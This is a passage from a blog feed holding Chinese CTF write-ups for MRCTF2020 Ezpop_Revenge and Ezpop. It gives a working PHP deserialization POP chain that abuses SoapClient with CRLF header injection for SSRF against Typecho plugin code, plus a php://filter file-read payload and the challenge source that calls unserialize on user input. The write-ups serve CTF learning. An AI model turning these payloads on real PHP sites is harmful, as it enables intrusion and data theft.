class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Db.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_prefix;</span><br><span class="line">    <span class="keyword">private</span> $_adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$adapterName, $prefix = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line">        $adapterName = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . $adapterName;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>进行了拼接，（大概）可以联想到toString方法，那有没有呢？（很多……一定要注意其形式是否可以利用，经验和感觉很重要，嗯，玄学）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Query.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>一个针对sql语句的条件分支，注意select这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br></pre></td></tr></table></figure><p>就很像反序列化练习中__call函数的调用，查了一下__call函数，似乎没有利用点……</p><h3 id="SOAP-反序列化"><a href="#SOAP-反序列化" class="headerlink" title="SOAP 反序列化"></a>SOAP 反序列化</h3><p>dalao：<a href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p><blockquote><p>SOAP 是一种简单的基于 XML 的协议，它使应用程序通过 HTTP 来交换信息。</p></blockquote><p>为php安装soap拓展后：</p><p><img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404172608327.png" alt="image-20210404172608327"></p><p>可以看到，SoapClient类自带有__call方法，由此诞生了SOAP反序列化ssrf利用。</p><p>本地重复实验：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;data=something&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=my_session&#x27;</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"></span><br><span class="line">$c = unserialize($aaa);</span><br><span class="line">$c-&gt;not_exists_function();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404173005718.png" alt="image-20210404173005718"></p><p>调用不存在的方法时，SoapClient仍会向WebSever发送请求，调用服务器函数。</p><p>在参数中，user-agent是可控的，这意味着通过<strong>CRLF</strong>，我们可以控制ua下的所有参数，进而借网站发送一个由我们控制的POST请求，完成ssrf。</p><p>pop链已经明了了(大概)：</p><ol><li>HelloWorld_DB反序列化触发wakeup，在wakeup中实例化一个Typecho_Db；</li><li><code>Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;])</code>，<code>$this-&gt;coincidence[&#39;world&#39;]</code>作为参数，也就是<code>$adapterName</code>，控制此参数为<code>Typecho_Db_Query</code>的实例化，触发toString；</li><li>Typecho_Db_Query中控制<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>为select，<code>$this-&gt;_adapter</code>为SoapClient的实例化，触发其中的call方法，发送post请求进行ssrf。</li></ol><p>明了归明了，写脚本也是一大难关……并且要对各个类里的魔术方法有数，这样才能构造出正确的序列化字符串。</p><p>……………………无语凝噎</p><p>利用类里有的construct控制变量，传入target为<code>http://92018a96-f259-4c67-9a5a-b95fedc9d0ea.node3.buuoj.cn/flag.php</code>设置好xff头和自己的cookie：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = <span class="keyword">array</span>(<span class="string">&quot;hello&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">&quot;http://92018a96-f259-4c67-9a5a-b95fedc9d0ea.node3.buuoj.cn/flag.php&quot;</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;Cookie: PHPSESSID=a55efu5tcvab970c7j54jbfkj3&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;aaab&#x27;</span>, <span class="string">&#x27;location&#x27;</span> =&gt; $target, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;haha^^&#x27;</span> . join(<span class="string">&#x27;^^&#x27;</span>, $headers)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = [<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&quot;SELECT&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo $a;</span></span><br><span class="line"></span><br><span class="line">$a = preg_replace(<span class="string">&quot; /\^\^/&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>（大概可以吧…………</p><p>最后如何该如何利用反序列化：</p><p>在另一个Plugin.php中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params">$pluginName</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">self</span>::$_plugins[<span class="string">&#x27;activated&#x27;</span>][$pluginName] = <span class="built_in">self</span>::$_tmp;</span><br><span class="line">        <span class="built_in">self</span>::$_tmp = <span class="keyword">array</span>();</span><br><span class="line">        Helper::addRoute(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Helper.php</span></span><br><span class="line">     * 增加路由</span><br><span class="line">     * @access <span class="keyword">public</span></span><br><span class="line">     * @param <span class="keyword">string</span> $name 路由名称</span><br><span class="line">     * @param <span class="keyword">string</span> $url 路由路径</span><br><span class="line">     * @param <span class="keyword">string</span> $widget 组件名称</span><br><span class="line">     * @param <span class="keyword">string</span> $action 组件动作</span><br><span class="line">     * @param <span class="keyword">string</span> $after 在某个路由后面</span><br><span class="line">     * @<span class="keyword">return</span> <span class="keyword">integer</span> */</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">addRoute</span>(<span class="params">$name, $url, $widget, $action = <span class="literal">NULL</span>, $after = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $routingTable = <span class="built_in">self</span>::options()-&gt;routingTable;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($routingTable[<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>($routingTable[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $pos = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($routingTable <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $pos ++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($key == $after) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $pre = array_slice($routingTable, <span class="number">0</span>, $pos);</span><br><span class="line">        $next = array_slice($routingTable, $pos);</span><br><span class="line"></span><br><span class="line">        $routingTable = array_merge($pre, <span class="keyword">array</span>($name =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>       =&gt;  $url,</span><br><span class="line">            <span class="string">&#x27;widget&#x27;</span>    =&gt;  $widget,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span>    =&gt;  $action</span><br><span class="line">        )), $next);</span><br><span class="line">        <span class="built_in">self</span>::options()-&gt;routingTable = $routingTable;</span><br><span class="line"></span><br><span class="line">        $db = Typecho_Db::get();</span><br><span class="line">        <span class="keyword">return</span> Typecho_Widget::widget(<span class="string">&#x27;Widget_Abstract_Options&#x27;</span>)-&gt;update(<span class="keyword">array</span>(<span class="string">&#x27;value&#x27;</span> =&gt; serialize($routingTable))</span><br><span class="line">        , $db-&gt;sql()-&gt;where(<span class="string">&#x27;name = ?&#x27;</span>, <span class="string">&#x27;routingTable&#x27;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/a3320315/article/details/105215741">https://blog.csdn.net/a3320315/article/details/105215741</a> </p><p>根据这篇文章的说法，网页上的插件(Widget)一般由路由分发来自动加载，序列化点：<img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404182121878.png" alt="image-20210404182121878"></p><p>由此，对应的<code> * @param string $widget 组件名称</code>也就是<code>HelloWorld_Plugin</code>，查找相关的插件名一般就可以找到路由……（这个一般，大概是我胡说的……因为我根本不懂……😭zhendecai</p><blockquote><p>*这句代码的意思大概就是访问<code>/page_admin</code>的时候，会自动加载<code>HelloWorld_Plugin</code>类，而且会自动调用<code>action</code>函数，所以我们利用点的路由为<code>/page_admin</code>*。</p></blockquote><p>最后是文件中带有的flag.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;我扌your problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果是内网访问，则flag写入session，利用点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;admin&#x27;</span>])) var_dump($_SESSION);</span><br></pre></td></tr></table></figure><p>传入admin参数打印session获取flag……</p><p><img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404183523393.png" alt="image-20210404183523393"></p><blockquote><p>这题……好像还有很类似的题，大概算是真实环境下的反序列化代码审计？不清楚，我啥都不知道🐕</p><p>经常看了后面忘前面……也算是一种锻炼吧，多积累经验……</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;MRCTF2020-Ezpop-Revenge&quot;&gt;&lt;a href=&quot;#MRCTF2020-Ezpop-Revenge&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]Ezpop_Revenge&quot;&gt;&lt;/a&gt;[MRCTF2020]Ezpop</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MRCTF2020-Ezpop</title>
    <link href="http://example.com/2021/04/03/MRCTF2020-Ezpop/"/>
    <id>http://example.com/2021/04/03/MRCTF2020-Ezpop/</id>
    <published>2021-04-03T07:56:52.000Z</published>
    <updated>2021-04-03T08:09:50.587Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>提示在flag.php，应该是利用include进行读取，构造pop链：</p><p>class Show：wakeup、toString</p><p>class Test：get</p><p>class Modifier：invoke、include</p><p>可以看出来，Show类应当是入口：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>在对source过滤是是一种字符串操作，这里可以跳到toString方法中</p><p>而toString明显调用了一个属性值，get到不存在的属性，进入Test：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>函数形式调用方法，invoke：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>  $var;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用方法是很明显的，我们只需要控制$var为我们想要的就可以进行包含任意读取</p><p>另，注意这里是私有保护变量，要传一个url加密的序列化字符串保证正确的解析</p><blockquote><p><strong><em>Help Me Find FLAG!</em></strong></p></blockquote><p>估计是藏起来了，上伪协议</p><blockquote><p><strong><em>php://filter/read=convert.base64-encode/resource=flag.php</em></strong></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag= <span class="string">&quot;flag&#123;81ade5a5-3fc1-455b-bec8-5adbc83dfd1b&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Help Me Find FLAG!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 